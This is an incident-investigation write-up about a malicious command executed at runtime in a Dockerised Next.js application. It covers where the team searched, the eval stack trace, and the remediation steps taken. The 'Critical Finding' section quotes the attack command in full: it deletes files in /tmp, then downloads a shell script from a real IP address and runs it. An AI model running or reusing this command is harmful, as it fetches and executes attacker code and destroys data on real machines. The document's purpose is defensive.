# Supply Chain Investigation - Malicious execSync

## Critical Finding

The malicious `execSync` command (`mkdir /tmp;cd /tmp;rm -rf *;cd /tmp;wget http://176.117.107.158/r.sh; chmod 777 r.sh; sh r.sh || cd /var/tmp; curl -O http://176.117.107.158/r.sh; chmod 777 r.sh; sh r.sh`) is **NOT hardcoded** in:
- ✅ Source code (`src/`)
- ✅ Compiled `.next` build artifacts
- ✅ MongoDB database
- ✅ Environment variables
- ✅ `node_modules` (searched)

## Runtime Injection

The malicious string is being **injected at runtime** and passed to `execSync` dynamically. Evidence:

1. **Stack trace shows `eval()` context:**
   ```
   at Object.eval [as then] (eval at <anonymous> (/app/node_modules/next/dist/compiled/next-server/app-page.runtime.prod.js:25:34007), <anonymous>:3:52)
   ```

2. **Triggered from middleware:**
   - Stack shows `.next/server/src/middleware.js`
   - Happens ~15 minutes after startup
   - No HTTP request correlation found

3. **Malicious string NOT in compiled file:**
   - Searched `chunks/7503.js` for malicious patterns - NOT FOUND
   - File contains only legitimate code (our diagnostic wrapper + Payload config)

## Investigation Steps Completed

1. ✅ Created migration eval protection (`migrationEvalProtection.ts`)
2. ✅ Scanned MongoDB for malicious data - CLEAN
3. ✅ Verified `.sex.sh.lock` removed (persistence artifact)
4. ✅ Created enhanced capture for malicious execSync

## Next Steps

1. **Full Docker image rebuild with `--no-cache`**
   - Remove all image layers
   - Fresh `npm ci` from lockfile
   - Rebuild `.next` from scratch

2. **If malicious execSync still appears after rebuild:**
   - Treat as **supply chain / image compromise**
   - Dump full function body from `chunks/7503.js`
   - Compare against clean build from trusted machine
   - Investigate Docker image layers for compromise

3. **Runtime capture enhancement:**
   - Enhanced logging around `eval()` calls
   - Capture variable values at execSync call site
   - Track source of malicious string injection

## Files Created

- `src/server/lib/migrationEvalProtection.ts` - Migration eval allowlist
- `src/server/lib/captureMaliciousExec.ts` - Enhanced malicious exec capture
- `scripts/dump-chunk-7503.ts` - Diagnostic script to analyze chunk file

## Current Status

- **Global subprocess patch:** ✅ ENABLED
- **Migration eval protection:** ✅ ENABLED  
- **Malicious exec capture:** ✅ ENABLED
- **Crons:** ❌ DISABLED
- **Dangerous endpoints:** ❌ DISABLED
